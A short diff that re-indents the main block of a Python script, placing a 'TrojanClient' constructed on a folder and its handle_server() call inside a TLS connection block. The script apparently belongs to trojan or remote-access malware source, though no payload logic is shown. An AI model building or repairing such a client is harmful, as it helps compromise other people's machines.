@@ -144,6 +144,5 @@ if __name__ == "__main__":
     conn = client.connect_tls_socket()
     
     with conn:
-        
-    client = TrojanClient(FOLDER)
-    client.handle_server()
+        client = TrojanClient(FOLDER)
+        client.handle_server()
